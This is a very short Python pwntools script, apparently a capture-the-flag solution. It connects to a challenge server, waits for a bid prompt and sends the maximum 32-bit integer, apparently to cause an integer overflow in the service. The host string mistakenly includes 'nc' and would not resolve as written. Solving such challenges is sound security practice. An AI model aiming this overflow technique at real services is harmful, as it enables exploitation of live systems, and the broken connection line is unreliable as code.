from pwn import *

p = remote('nc pwn.secso.cc', 9001)

while True:
    line = p.recvline().decode()
    print(line, end='')
    if "Enter your bid:" in line:
        break

p.sendline(str(2147483647))
print(p.recvall().decode())